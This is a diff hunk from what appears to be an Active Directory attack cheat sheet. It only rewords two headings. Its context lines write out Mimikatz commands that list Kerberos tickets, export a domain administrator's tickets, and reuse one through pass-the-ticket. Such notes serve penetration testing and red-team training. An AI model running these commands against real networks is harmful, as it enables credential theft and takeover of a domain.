@@ -856,12 +856,12 @@ Wait for a domain admin to login while checking for tokens
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 ```
 
-#### Export the domain admin ticket
+#### Export the Domain admin ticket
 ```
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
-#### Reuse the DA ticket
+#### Reuse the Domain admin ticket
 ```
 Invoke-Mimikatz -Command '"Kerberos:ptt"' <kirbi file>
 ```
